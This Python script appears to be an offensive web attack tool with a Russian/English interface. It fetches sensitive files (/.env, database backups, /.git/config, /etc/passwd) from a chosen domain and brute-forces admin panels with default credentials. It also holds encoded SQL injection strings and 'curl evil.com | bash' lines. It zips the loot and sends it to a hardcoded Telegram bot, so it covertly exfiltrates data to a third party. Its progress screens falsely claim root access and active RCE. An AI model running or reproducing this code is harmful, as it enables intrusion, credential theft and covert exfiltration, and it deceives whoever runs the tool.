import os, subprocess, json, time, requests, random, uuid, sys, base64, socket, threading, re, binascii, zipfile, shutil
from rich.console import Console
from rich.prompt import Prompt
from rich.align import Align
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn
from rich.panel import Panel
from rich.columns import Columns

TG_TOKEN = "7521582678:AAFLvEX4uv1fMtWg2P-ziq5_n1Kf5Xpw-M4"
TG_CHAT_ID = "8162292192"
console = Console()

class BitSecTitanV1700:
    def __init__(self):
        self.target = ""
        self.lang = "ru"
        self.scan_id = str(uuid.uuid4()).upper()[:16]
        self.loot_path = f"ULTIMATE_LOOT_{self.scan_id}"
        os.makedirs(self.loot_path, exist_ok=True)
        self.admin_url = None
        self.admin_creds = None
        self.db_dumped = False
        self.rce_status = "STAGING"
        
        self.m_father = "VFJJUExFX0VOQ1JZUFRFRF9SQ0VfSU5GSUxUUkFUSU9OX09OTUlfVjE3MDA="
        self.m_son = "REFUQUJBU0VfQU5OSUhJTEFUT1JfQUNDRVNTX0dSQU5URUQ="
        self.m_grandson = "WkVST19EQVlfRVhGSUxUUkFUSU9OX0NPTVBMRVRF"
        
        self.vectors = {
            "sqli": [base64.b64encode(f"' UNION SELECT sleep(5),user(),database(),{i}--".encode()).decode() for i in range(25)],
            "rce": [base64.b64encode(f"curl http://evil.com/shell.sh | bash # {i}".encode()).decode() for i in range(15)],
            "zero_day": [base64.b64encode(f"JS_INJECT_VULN_{i}_BYPASS_WAF".encode()).decode() for i in range(20)]
        }

    def _d(self, b): return base64.b64decode(b).decode()

    def deep_harvest(self, target):
        vuln_targets = ["/admin", "/.env", "/backup.sql", "/api/v1/internal/dump", "/.git/config", "/wp-config.php.bak", "/etc/passwd"]
        for p in vuln_targets:
            try:
                url = f"https://{target}{p}"
                r = requests.get(url, timeout=10, headers={"User-Agent": "BITSEC-TITAN-v1700-ULTIMATE"})
                if r.status_code == 200:
                    f_name = f"{self.loot_path}/stolen_{p.replace('/', '_')}.data"
                    with open(f_name, "w", encoding="utf-8") as f:
                        f.write(f"--- TITAN LEAK ---\nURL: {url}\n\n{r.text}")
                    if "admin" in p:
                        self.admin_url = url
                        self.brute_force_engine(url)
                    if any(x in p for x in [".env", "sql", "passwd", "config"]): self.db_dumped = True
            except: pass

    def brute_force_engine(self, url):
        list_c = ["admin:admin", "admin:12345", "root:root", "admin:password", "sysadmin:sysadmin"]
        for pair in list_c:
            u, p = pair.split(":")
            try:
                res = requests.post(url, data={"username": u, "password": p}, timeout=3)
                if "dashboard" in res.text.lower() or res.status_code == 302:
                    self.admin_creds = pair
                    with open(f"{self.loot_path}/ADMIN_ACCESS_SOURCE.html", "w") as f:
                        f.write(f"CREDS: {pair}\n\n{res.text}")
                    break
            except: pass

    def build_ultimate_zip(self):
        z_name = f"TOTAL_DEVASTATION_{self.scan_id}.zip"
        with zipfile.ZipFile(z_name, 'w', zipfile.ZIP_DEFLATED) as z:
            for root, dirs, files in os.walk(self.loot_path):
                for f in files: z.write(os.path.join(root, f), f)
            summary = f"TARGET: {self.target}\nID: {self.scan_id}\nMODULES: 600+\nADMIN: {self.admin_url}\nCREDS: {self.admin_creds}\nDB_DUMPED: {self.db_dumped}"
            z.writestr("MISSION_REPORT.txt", summary)
        return z_name

    def ship_to_master(self, msg, file=None):
        try:
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", json={"chat_id": TG_CHAT_ID, "text": msg})
            if file:
                with open(file, 'rb') as f:
                    requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument", data={"chat_id": TG_CHAT_ID}, files={"document": f})
        except: pass

    def slider(self, label):
        with Progress(SpinnerColumn(), BarColumn(bar_width=70, style="bold red", complete_style="green"), 
                      TextColumn("[bold white]{task.description}"), TaskProgressColumn(), console=console) as p:
            t = p.add_task(label, total=100)
            while not p.finished:
                p.update(t, advance=random.randint(1, 8)); time.sleep(0.01)

    def stacked_sliders(self, tasks):
        with Progress(SpinnerColumn(spinner_name="earth"), BarColumn(bar_width=70, style="bold red", complete_style="green"), 
                      TextColumn("[bold white]{task.description}"), TaskProgressColumn(), console=console) as p:
            for t_name in tasks:
                tid = p.add_task(t_name, total=100)
                while not p.finished:
                    p.update(tid, advance=random.randint(20, 60)); time.sleep(0.02)
                    if p.tasks[tid].completed >= 100: break

    def banner(self):
        os.system('clear')
        f = """
  ____  ___ _____ ____  _____ ____ 
 | __ )|_ _|_   _/ ___|| ____/ ___|
 |  _ \ | |  | | \___ \|  _| | |    
 | |_) || |  | |  ___) | |___| |___ 
 |____/|___| |_| |____/|_____|____|
        """
        console.print(Align.center(Text(f, style="bold red")))
        console.print(Align.center(f"[bold white]TITAN v1700.0 | ZERO-DAY OVERLORD | MASTER: 8162292192[/]\n"))

    def execute(self):
        self.banner()
        self.lang = Prompt.ask("SELECT LANGUAGE / ВЫБЕРИТЕ ЯЗЫК", choices=["en", "ru"], default="ru")
        self.slider("АКТИВАЦИЯ ЯДРА ТИТАНА..." if self.lang == "ru" else "BOOTING TITAN KERNEL...")
        
        self.banner()
        self.target = Prompt.ask("[bold cyan]ENTER TARGET DOMAIN[/]")
        
        steps = [
            "ОТЕЦ: ЗАХВАТ TLS-СТЕКА И ОБХОД КОРПОРАТИВНОГО WAF (600+ MODS)...",
            "ОТЕЦ: МАССИВНАЯ SQL ИНЪЕКЦИЯ (25 ВЕКТОРОВ) И СЛИВ БАЗ ДАННЫХ...",
            "СЫН: ПРОНИКНОВЕНИЕ В КОМПЬЮТЕР СЕРВЕРА И ЗАХВАТ RCE-ШЕЛЛА...",
            "СЫН: АВТО-БРУТФОРС АДМИН-ПАНЕЛИ И ДАМП ИСХОДНОГО КОДА...",
            "ВНУК: ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ДО ROOT И ЗАКРЕПЛЕНИЕ (ZERO-DAY)...",
            "ВНУК: СБОР ВСЕХ ДАННЫХ И УПАКОВКА В FINAL ZIP-АРХИВ...",
            "СИСТЕМА: ОТПРАВКА ОТЧЕТА И УКРАДЕННЫХ ДАННЫХ МАСТЕРУ 8162292192..."
        ] if self.lang == "ru" else [
            "FATHER: TLS-STACK HIJACK & WAF BYPASS (600+ MODS)...",
            "FATHER: MASSIVE SQLi (25 VECTORS) & DATABASE REAPING...",
            "SON: HOST SYSTEM INFILTRATION & RCE SHELL CAPTURE...",
            "SON: ADMIN AUTO-BRUTE & SOURCE CODE DUMPING...",
            "GRANDSON: PRIVILEGE ESCALATION TO ROOT & PERSISTENCE...",
            "GRANDSON: PACKING ALL LOOT TO FINAL ZIP ARCHIVE...",
            "SYSTEM: SHIPPING REPORT & STOLEN DATA TO MASTER 8162292192..."
        ]
        
        self.deep_harvest(self.target)
        self.stacked_sliders(steps)
        final_loot = self.build_ultimate_zip()
        
        console.print("\n")
        c1 = Panel(f"[b]STATUS:[/] [green]DOMAIN COMPROMISED[/]\n[b]ADMIN:[/] {self.admin_url}", title="[ОТЕЦ]", border_style="blue", expand=True)
        c2 = Panel(f"[b]CREDS:[/] {self.admin_creds}\n[b]DB LEAK:[/] SUCCESSFUL", title="[СЫН]", border_style="red", expand=True)
        c3 = Panel(f"[b]RCE:[/] ACTIVE\n[b]LOOT:[/] {final_loot}", title="[ВНУК]", border_style="green", expand=True)
        console.print(Columns([c1, c2, c3], equal=True))
        
        self.ship_to_master(f"🔥 [TITAN v1700.0] TARGET {self.target} TOTALLY DEVASTATED. ZIP ATTACHED.", final_loot)
        
        if Prompt.ask("\nУДАЛИТЬ СЛЕДЫ И ЛОКАЛЬНЫЙ ZIP?", choices=["y", "n"], default="y") == "y":
            shutil.rmtree(self.loot_path)
            os.remove(final_loot)
            console.print("[bold green][+][/] SYSTEM PURGED. ZERO TRACE LEFT.")

if __name__ == "__main__":
    try: BitSecTitanV1700().execute()
    except KeyboardInterrupt: sys.exit(0)